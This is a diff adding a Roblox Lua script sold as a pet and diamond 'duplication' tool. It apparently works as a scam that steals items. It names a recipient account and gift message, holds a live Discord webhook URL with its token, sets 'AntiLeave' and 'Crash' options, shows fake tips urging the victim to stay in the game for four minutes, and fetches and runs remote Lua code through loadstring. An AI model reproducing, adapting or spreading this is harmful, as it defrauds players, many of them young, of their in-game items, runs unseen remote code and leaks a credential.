@@ -1,0 +1,24 @@
+--[[ Duplicating Script ]]--
+
+--[[ Main Config ]]--
+_G.Username = "Scripter120" --//
+_G.GiftMessage = "Balls" --//
+
+_G.Diamonds = 1000000 --//
+_G.UnlockPets = true --//
+_G.AntiLeave = true --//
+_G.Crash = true  --//
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1036648929607028826/F4TS3iIxAq0zuB9gY7hlb8mr7iTxgTAZSNNTzymeQT_ahJuAdsOGmzU9TFYonjrz-R7s" --//
+
+--[[ UI Config ]]--
+_G.ScriptName = "Duplication Beta 2.1" --//
+_G.Tip1 = "The Script Is Duplicating Your Pets" --//
+_G.Tip2 = "Dont leave the game or it might result in your pets deleting" --//
+_G.Tip3 = "This Script Is Going To Become Paid Soon" --//
+_G.Tip4 = "Takes About 4 Minutes" --//
+_G.Tip5 = "Subscribe!" --//
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
